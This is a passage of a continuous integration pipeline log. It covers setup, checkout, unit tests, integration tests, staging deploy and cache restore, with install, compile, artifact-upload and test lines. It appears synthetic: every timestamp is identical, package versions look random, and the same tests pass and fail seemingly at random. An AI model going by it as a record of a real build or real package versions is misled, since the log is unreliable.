src/app.ts...\nStep 9/10: Building\nCompiling src/index.js...\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (2MB)\nInstalling jest@5.1.0\n[12:00:26] INFO: Processing request\nCache hit for key-9675\nInstalling jest@4.4.0\n\u2713 lint completed\n\u2713 test completed\nInstalling prettier@2.9.0\nInstalling react@1.2.0\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n\u2713 test completed\nStep 9/10: Building\n  PASS: test_db_connect (279ms)\nStep 8/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-5618\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nStep 3/10: Building\nInstalling lodash@2.3.0\nStep 5/10: Building\nCache hit for key-1100\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/app.ts...\n  PASS: test_auth_login (272ms)\nStep 2/10: Building\nInstalling prettier@1.17.0\n\u2713 build completed\n[12:00:26] INFO: Processing request\nCache hit for key-5515\n[12:00:26] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-6441\nArtifact uploaded: build.tar.gz (44MB)\nInstalling eslint@4.15.0\n[12:00:26] WARN: Deprecated API usage\n\u2713 build completed\nStep 9/10: Building\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (258ms)\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (49MB)\nInstalling eslint@5.5.0\nStep 5/10: Building\nCache hit for key-7113\nCompiling src/service.java...\n\u2713 build completed\nInstalling express@2.17.0\nStep 3/10: Building\n\u2713 lint completed\nStep 9/10: Building\nWARNING: axios has known vulnerabilities\nCompiling src/handler.rs...\n\u2713 lint completed\n\u2713 build completed\n[12:00:26] INFO: Processing request\n\u2713 test completed\nCompiling src/index.js...\nCompiling src/app.ts...\n[12:00:26] INFO: Processing request\nInstalling jest@4.7.0\nStep 9/10: Building\n  PASS: test_auth_login (316ms)\n  PASS: test_api_health (122ms)\nInstalling eslint@3.17.0\nException: ValueError\n  PASS: test_api_health (344ms)\n[12:00:26] INFO: Processing request\nInstalling axios@5.5.0\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:26] INFO: Processing request\nInstalling prettier@4.15.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 test completed\n  PASS: test_user_create (485ms)\nCompiling src/app.ts...\n  PASS: test_db_connect (27ms)\n[12:00:26] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_user_create (447ms)\nInstalling jest@4.9.0\nStep 4/10: Building\nStep 8/10: Building\nCache hit for key-2856\nCompiling src/service.java...\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n  PASS: test_db_connect (176ms)\nCompiling src/service.java...\n\u2713 build completed\n\u2713 build completed\nWARNING: axios has known vulnerabilities\n\u2713 build completed\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/index.js...\nStep 4/10: Building\n  PASS: test_db_connect (294ms)\nCache hit for key-4981\n[12:00:26] INFO: Processing request\n  PASS: test_api_health (250ms)\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\nCache hit for key-7130\nCache hit for key-9431\nInstalling jest@3.17.0\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (3MB)\nException: TypeError\nCompiling src/main.py...\n  PASS: test_api_health (376ms)\nWARNING: webpack has known vulnerabilities\nCompiling src/index.js...\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:26] ERROR: Connection failed\nStep 9/10: Building\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\n  PASS: test_db_connect (444ms)\nCompiling src/app.ts...\nInstalling react@2.9.0\nCache hit for key-4392\nCache hit for key-9884\nArtifact uploaded: build.tar.gz (12MB)\nWARNING: jest has known vulnerabilities\n  PASS: test_user_create (451ms)\nInstalling react@4.4.0\nCache hit for key-4476\nArtifact uploaded: build.tar.gz (35MB)\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_api_health (179ms)\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_user_create (124ms)\n=== Step setup_environment completed ===\n=== Step: checkout ===\n\u2713 test completed\n\u2713 lint completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:26] INFO: Processing request\nInstalling webpack@1.19.0\n\u2713 build completed\nCache hit for key-3039\nFAILED: test_user_create\nCompiling src/index.js...\nInstalling lodash@2.4.0\nCache hit for key-1575\n\u2713 build completed\nCompiling src/main.py...\n[12:00:26] INFO: Processing request\nStep 10/10: Building\n[12:00:26] INFO: Processing request\nStep 3/10: Building\nInstalling lodash@3.6.0\n  PASS: test_user_create (1ms)\nStep 8/10: Building\nInstalling webpack@3.10.0\n  PASS: test_cache_hit (372ms)\nStep 2/10: Building\nCache hit for key-6435\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nInstalling webpack@1.12.0\n[12:00:26] INFO: Processing request\nInstalling prettier@5.7.0\nWARNING: jest has known vulnerabilities\nStep 7/10: Building\nInstalling axios@3.7.0\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_user_create (284ms)\nCache hit for key-6624\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (13MB)\nInstalling express@2.7.0\n  PASS: test_cache_hit (235ms)\nArtifact uploaded: build.tar.gz (33MB)\nStep 8/10: Building\nInstalling webpack@5.8.0\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\nWARNING: react has known vulnerabilities\n[12:00:26] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-1697\n\u2713 build completed\nInstalling lodash@4.12.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: jest has known vulnerabilities\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/app.ts...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:26] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/service.java...\nCache hit for key-1466\nCompiling src/utils.go...\nCache hit for key-5542\nCache hit for key-8969\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_auth_login (43ms)\n[12:00:26] INFO: Processing request\n  PASS: test_auth_login (489ms)\n\u2713 test completed\n  PASS: test_api_health (153ms)\n  PASS: test_db_connect (195ms)\n[12:00:26] INFO: Processing request\nException: ValueError\n  PASS: test_auth_login (69ms)\nCompiling src/service.java...\nCache hit for key-3459\n\u2713 lint completed\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/utils.go...\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n\u2713 build completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-6242\n[12:00:26] INFO: Processing request\nCache hit for key-9073\n\u2713 test completed\nArtifact uploaded: build.tar.gz (6MB)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (49MB)\nCache hit for key-9385\nStep 3/10: Building\n[12:00:26] INFO: Processing request\nCompiling src/handler.rs...\nStep 7/10: Building\n\u2713 test completed\nInstalling webpack@5.16.0\n[12:00:26] INFO: Processing request\n\u2713 build completed\n[12:00:26] INFO: Processing request\nInstalling react@5.2.0\n  PASS: test_api_health (176ms)\n\u2717 build failed with exit code 82\nCache hit for key-8176\nInstalling react@1.17.0\n[12:00:26] INFO: Processing request\nWARNING: jest has known vulnerabilities\n  PASS: test_api_health (339ms)\n[12:00:26] INFO: Processing request\n  PASS: test_db_connect (306ms)\nCompiling src/index.js...\nStep 10/10: Building\n  PASS: test_db_connect (186ms)\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nInstalling eslint@5.13.0\nCache hit for key-2338\n[12:00:26] INFO: Processing request\nCache hit for key-7388\nException: NullPointerException\n[12:00:26] ERROR: Connection failed\n  PASS: test_db_connect (268ms)\nCompiling src/handler.rs...\n[12:00:26] INFO: Processing request\nCache hit for key-1317\nStep 9/10: Building\nInstalling jest@2.14.0\n\u2713 lint completed\nCache hit for key-5885\nInstalling eslint@2.18.0\nCompiling src/app.ts...\n  PASS: test_api_health (142ms)\nCache hit for key-6804\nCache hit for key-7489\nCompiling src/app.ts...\n\u2713 test completed\nCompiling src/utils.go...\n  PASS: test_auth_login (334ms)\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-6927\nCache hit for key-9670\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 build completed\nCompiling src/service.java...\nStep 1/10: Building\nInstalling express@3.19.0\nCache hit for key-1589\nInstalling react@2.2.0\nCompiling src/utils.go...\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-2807\nCompiling src/handler.rs...\nStep 8/10: Building\nCompiling src/service.java...\nWARNING: jest has known vulnerabilities\nInstalling lodash@5.17.0\nCompiling src/handler.rs...\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nStep 10/10: Building\n  PASS: test_auth_login (284ms)\nStep 9/10: Building\nCache hit for key-5078\nCache hit for key-6051\nCache hit for key-6016\n  PASS: test_auth_login (201ms)\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nInstalling prettier@3.19.0\nCompiling src/handler.rs...\n=== Step checkout completed ===\n=== Step: unit_tests ===\n[12:00:26] INFO: Processing request\nCache hit for key-6212\n\u2713 lint completed\nWARNING: react has known vulnerabilities\n  PASS: test_cache_hit (317ms)\n[12:00:26] INFO: Processing request\n  PASS: test_api_health (326ms)\nStep 6/10: Building\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nStep 10/10: Building\n\u2713 build completed\n\u2713 test completed\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (23MB)\nStep 7/10: Building\nStep 6/10: Building\nCompiling src/main.py...\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:26] INFO: Processing request\nInstalling eslint@2.13.0\nCache hit for key-3840\nCache hit for key-4724\nCache hit for key-6893\nCache hit for key-3184\nCompiling src/utils.go...\nInstalling prettier@2.5.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nFAILED: test_cache_hit\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCompiling src/handler.rs...\nInstalling express@2.1.0\n  PASS: test_user_create (168ms)\nCompiling src/app.ts...\nCache hit for key-5231\nCache hit for key-5624\n[12:00:26] INFO: Processing request\nStep 7/10: Building\n\u2713 build completed\n[12:00:26] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-7594\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/app.ts...\nCache hit for key-1095\nCompiling src/app.ts...\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\n[12:00:26] ERROR: Connection failed\n  PASS: test_db_connect (54ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 build completed\n  PASS: test_db_connect (110ms)\n  PASS: test_user_create (371ms)\nCompiling src/service.java...\nCompiling src/handler.rs...\n[12:00:26] INFO: Processing request\nStep 10/10: Building\nCompiling src/app.ts...\nInstalling express@2.16.0\nCache hit for key-6449\nCache hit for key-3382\nWARNING: lodash has known vulnerabilities\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_cache_hit (111ms)\n[12:00:26] INFO: Processing request\n[12:00:26] WARN: Deprecated API usage\n\u2713 lint completed\n  PASS: test_auth_login (439ms)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (36MB)\nStep 2/10: Building\nStep 9/10: Building\nCache hit for key-2245\n[12:00:26] INFO: Processing request\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nStep 5/10: Building\nCache hit for key-5866\n[12:00:26] INFO: Processing request\nStep 5/10: Building\nCache hit for key-6592\n  PASS: test_api_health (328ms)\nCache hit for key-4693\nStep 2/10: Building\n[12:00:26] INFO: Processing request\n\u2713 test completed\n\u2713 test completed\n[12:00:26] INFO: Processing request\nStep 4/10: Building\n\u2713 build completed\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/utils.go...\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nWARNING: react has known vulnerabilities\nInstalling lodash@3.14.0\nInstalling eslint@1.13.0\nCompiling src/service.java...\n[12:00:26] ERROR: Connection failed\nInstalling eslint@4.1.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling jest@4.1.0\n  PASS: test_auth_login (413ms)\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (410ms)\n[12:00:26] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (50MB)\nStep 1/10: Building\n  PASS: test_cache_hit (314ms)\n[12:00:26] INFO: Processing request\nCache hit for key-8895\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_db_connect (487ms)\nStep 2/10: Building\nCache hit for key-4602\nCompiling src/index.js...\nStep 10/10: Building\n  PASS: test_auth_login (81ms)\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\nStep 2/10: Building\nCompiling src/service.java...\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\nInstalling axios@3.15.0\nCache hit for key-2113\nArtifact uploaded: build.tar.gz (41MB)\nStep 6/10: Building\nCache hit for key-1737\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/handler.rs...\nCompiling src/app.ts...\nCompiling src/utils.go...\n[12:00:26] INFO: Processing request\nCache hit for key-7366\nStep 8/10: Building\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\nException: NullPointerException\n[12:00:26] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 test completed\n  PASS: test_user_create (371ms)\nCache hit for key-2640\n[12:00:26] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_api_health (379ms)\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-1199\nWARNING: react has known vulnerabilities\n  PASS: test_user_create (363ms)\n[12:00:26] ERROR: Connection failed\nInstalling react@3.19.0\nArtifact uploaded: build.tar.gz (17MB)\nStep 2/10: Building\nInstalling jest@4.1.0\nCache hit for key-2988\n\u2713 test completed\nCache hit for key-8366\nCompiling src/index.js...\nCache hit for key-2220\nCache hit for key-9412\n=== Step unit_tests completed ===\n=== Step: integration_tests ===\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-2357\nInstalling eslint@4.12.0\n\u2713 test completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_cache_hit (282ms)\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCache hit for key-4129\n\u2713 lint completed\nFAILED: test_api_health\n\u2713 test completed\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-3282\nArtifact uploaded: build.tar.gz (49MB)\nCache hit for key-1267\nCompiling src/service.java...\nCompiling src/service.java...\n  PASS: test_db_connect (331ms)\n\u2713 build completed\nCompiling src/main.py...\n[12:00:26] INFO: Processing request\nStep 10/10: Building\nCache hit for key-7031\nCompiling src/handler.rs...\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (416ms)\n\u2713 lint completed\nStep 8/10: Building\n  PASS: test_db_connect (216ms)\n[12:00:26] INFO: Processing request\nInstalling prettier@2.8.0\nStep 2/10: Building\nStep 2/10: Building\n\u2713 build completed\n  PASS: test_api_health (251ms)\n[12:00:26] INFO: Processing request\n  PASS: test_db_connect (207ms)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (29MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-4844\nCache hit for key-4757\n[12:00:26] INFO: Processing request\nCache hit for key-7004\n  PASS: test_api_health (271ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/app.ts...\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (384ms)\n  PASS: test_db_connect (240ms)\nArtifact uploaded: build.tar.gz (10MB)\nStep 6/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\nCache hit for key-8788\nCompiling src/service.java...\n[12:00:26] WARN: Deprecated API usage\nCache hit for key-7337\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-7580\nInstalling lodash@4.19.0\nException: ValueError\nArtifact uploaded: build.tar.gz (28MB)\nCompiling src/index.js...\n  PASS: test_db_connect (63ms)\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:26] WARN: Deprecated API usage\nCache hit for key-3817\nStep 1/10: Building\nInstalling lodash@5.8.0\n\u2713 lint completed\n  PASS: test_db_connect (48ms)\nInstalling express@5.4.0\nCache hit for key-5923\n\u2713 lint completed\nInstalling prettier@4.11.0\nStep 1/10: Building\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCompiling src/main.py...\n[12:00:26] INFO: Processing request\nStep 3/10: Building\nCache hit for key-2350\nCache hit for key-6136\nCompiling src/main.py...\nStep 9/10: Building\nInstalling jest@3.12.0\n\u2713 lint completed\nInstalling express@2.1.0\n[12:00:26] INFO: Processing request\nStep 7/10: Building\n\u2717 build failed with exit code 119\n[12:00:26] WARN: Deprecated API usage\nCache hit for key-2637\nInstalling prettier@3.7.0\nCompiling src/app.ts...\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_user_create (430ms)\n  PASS: test_user_create (336ms)\nCache hit for key-9370\nStep 3/10: Building\n[12:00:26] WARN: Deprecated API usage\n\u2713 test completed\nStep 7/10: Building\n[12:00:26] INFO: Processing request\nCache hit for key-1689\n  PASS: test_api_health (106ms)\nStep 2/10: Building\nCache hit for key-8405\nCache hit for key-5269\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-1308\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_cache_hit (148ms)\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (465ms)\n  PASS: test_user_create (228ms)\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/index.js...\n  PASS: test_cache_hit (354ms)\nCache hit for key-5657\nStep 5/10: Building\n[12:00:26] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (38MB)\nStep 5/10: Building\nCompiling src/service.java...\n\u2713 build completed\nException: TypeError\n\u2713 lint completed\n[12:00:26] INFO: Processing request\nStep 3/10: Building\nCache hit for key-9527\nStep 8/10: Building\nCache hit for key-3499\n[12:00:26] INFO: Processing request\nStep 2/10: Building\nInstalling axios@5.2.0\n\u2713 lint completed\n\u2713 lint completed\nInstalling express@3.20.0\nArtifact uploaded: build.tar.gz (3MB)\nStep 5/10: Building\nCompiling src/index.js...\nInstalling webpack@4.15.0\n  PASS: test_api_health (253ms)\nFAILED: test_auth_login\n[12:00:26] WARN: Deprecated API usage\nCompiling src/main.py...\nCache hit for key-2263\n\u2713 test completed\nArtifact uploaded: build.tar.gz (14MB)\nException: ValueError\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:26] WARN: Deprecated API usage\nCache hit for key-7897\nCache hit for key-4796\nCompiling src/index.js...\nStep 2/10: Building\nCompiling src/service.java...\nFAILED: test_api_health\n  PASS: test_user_create (220ms)\nStep 8/10: Building\nCache hit for key-9932\nCache hit for key-1615\n=== Step integration_tests completed ===\n=== Step: deploy_staging ===\n\u2713 build completed\n[12:00:26] WARN: Deprecated API usage\n  PASS: test_auth_login (182ms)\nFAILED: test_cache_hit\n  PASS: test_cache_hit (94ms)\nStep 6/10: Building\nWARNING: webpack has known vulnerabilities\nWARNING: react has known vulnerabilities\nInstalling eslint@3.8.0\n\u2713 lint completed\nInstalling express@3.13.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:26] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/index.js...\n\u2713 lint completed\nCache hit for key-4668\n[12:00:26] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: NullPointerException\nCompiling src/handler.rs...\nStep 4/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (43MB)\nStep 10/10: Building\n[12:00:26] INFO: Processing request\nCache hit for key-7259\n\u2713 test completed\nInstalling jest@3.13.0\nInstalling jest@1.19.0\n  PASS: test_api_health (343ms)\nInstalling webpack@2.8.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@4.11.0\nCompiling src/service.java...\nCompiling src/main.py...\nCompiling src/service.java...\n[12:00:26] INFO: Processing request\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\nCache hit for key-4343\nInstalling jest@1.0.0\nCache hit for key-6235\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 50\n[12:00:26] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-7871\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/main.py...\nStep 10/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (11MB)\nStep 7/10: Building\n\u2713 lint completed\nCache hit for key-7328\n\u2713 build completed\nCompiling src/utils.go...\n[12:00:26] INFO: Processing request\nCompiling src/index.js...\nInstalling eslint@3.11.0\nInstalling jest@2.4.0\n[12:00:26] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 test completed\nCompiling src/app.ts...\nStep 5/10: Building\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/index.js...\nStep 2/10: Building\nInstalling express@2.1.0\nWARNING: react has known vulnerabilities\n  PASS: test_db_connect (277ms)\nCompiling src/service.java...\n  PASS: test_db_connect (352ms)\nCache hit for key-8806\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (47MB)\nInstalling eslint@4.9.0\nCompiling src/main.py...\n  PASS: test_api_health (333ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: jest has known vulnerabilities\n\u2713 lint completed\nCache hit for key-1086\n  PASS: test_user_create (23ms)\n[12:00:26] INFO: Processing request\nCompiling src/app.ts...\nStep 10/10: Building\n[12:00:26] ERROR: Connection failed\nInstalling lodash@2.1.0\nCache hit for key-2356\n[12:00:26] INFO: Processing request\nInstalling axios@4.19.0\nArtifact uploaded: build.tar.gz (23MB)\nStep 2/10: Building\nInstalling eslint@3.9.0\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:26] INFO: Processing request\nStep 9/10: Building\n[12:00:26] INFO: Processing request\nCache hit for key-2450\nCache hit for key-5916\nWARNING: react has known vulnerabilities\nInstalling eslint@2.8.0\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 build completed\nCompiling src/index.js...\nCompiling src/app.ts...\nCache hit for key-4799\nStep 2/10: Building\nInstalling express@3.13.0\nStep 5/10: Building\n[12:00:26] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (22MB)\nFAILED: test_db_connect\n  PASS: test_cache_hit (216ms)\nStep 9/10: Building\n[12:00:26] INFO: Processing request\nInstalling react@1.6.0\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-2193\nArtifact uploaded: build.tar.gz (5MB)\nInstalling prettier@4.17.0\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-5813\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/app.ts...\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_db_connect (429ms)\n\u2713 test completed\nStep 7/10: Building\nInstalling prettier@3.1.0\n\u2713 lint completed\nCache hit for key-1867\n\u2713 lint completed\nInstalling prettier@5.16.0\n  PASS: test_cache_hit (299ms)\n\u2713 lint completed\nCache hit for key-2614\nInstalling lodash@3.19.0\nInstalling react@5.4.0\nInstalling react@2.9.0\nInstalling react@2.9.0\n\u2713 lint completed\n[12:00:26] INFO: Processing request\n\u2713 test completed\nWARNING: eslint has known vulnerabilities\nWARNING: jest has known vulnerabilities\nCache hit for key-3997\n[12:00:26] INFO: Processing request\nInstalling eslint@1.0.0\n\u2713 build completed\n  PASS: test_api_health (187ms)\n[12:00:26] INFO: Processing request\n  PASS: test_db_connect (160ms)\nWARNING: express has known vulnerabilities\n[12:00:26] INFO: Processing request\nCache hit for key-6226\nStep 4/10: Building\n  PASS: test_db_connect (28ms)\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\nCache hit for key-9834\nCache hit for key-5929\nInstalling react@5.6.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:26] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling jest@3.9.0\n  PASS: test_api_health (476ms)\n  PASS: test_auth_login (445ms)\nInstalling prettier@1.20.0\nStep 5/10: Building\nCompiling src/handler.rs...\n  PASS: test_user_create (158ms)\nCompiling src/main.py...\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_db_connect (461ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:26] INFO: Processing request\nStep 8/10: Building\nInstalling jest@4.7.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-1289\n  PASS: test_auth_login (442ms)\n[12:00:26] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-1714\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n\u2713 build completed\nCompiling src/app.ts...\n  PASS: test_db_connect (469ms)\n[12:00:26] INFO: Processing request\nCache hit for key-9455\nCache hit for key-1748\nCache hit for key-6284\nStep 1/10: Building\n[12:00:26] INFO: Processing request\n[12:00:26] WARN: Deprecated API usage\nInstalling react@1.15.0\nCache hit for key-5420\nStep 8/10: Building\n[12:00:26] WARN: Deprecated API usage\nStep 8/10: Building\nCache hit for key-5853\n\u2713 test completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-1404\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/handler.rs...\nCache hit for key-8181\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n  PASS: test_db_connect (214ms)\n[12:00:26] WARN: Deprecated API usage\nInstalling axios@5.20.0\nStep 8/10: Building\n  PASS: test_auth_login (249ms)\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_auth_login (70ms)\n  PASS: test_db_connect (232ms)\n  PASS: test_db_connect (459ms)\nStep 1/10: Building\nCompiling src/index.js...\nInstalling lodash@2.11.0\n  PASS: test_user_create (456ms)\nInstalling lodash@5.13.0\nCache hit for key-9979\n[12:00:26] WARN: Deprecated API usage\nInstalling webpack@5.19.0\nArtifact uploaded: build.tar.gz (20MB)\nStep 5/10: Building\n[12:00:26] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nStep 3/10: Building\nStep 5/10: Building\nCompiling src/app.ts...\n\u2717 build failed with exit code 100\n[12:00:26] WARN: Deprecated API usage\nCompiling src/app.ts...\nInstalling lodash@4.9.0\n  PASS: test_api_health (4ms)\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 test completed\nCache hit for key-4574\n[12:00:26] WARN: Deprecated API usage\nException: ValueError\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:26] INFO: Processing request\n  PASS: test_auth_login (365ms)\n  PASS: test_cache_hit (31ms)\n\u2713 build completed\nStep 3/10: Building\n\u2713 build completed\n[12:00:26] ERROR: Connection failed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:26] WARN: Deprecated API usage\nCompiling src/service.java...\nInstalling react@1.3.0\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_auth_login (464ms)\nException: RuntimeError\n  PASS: 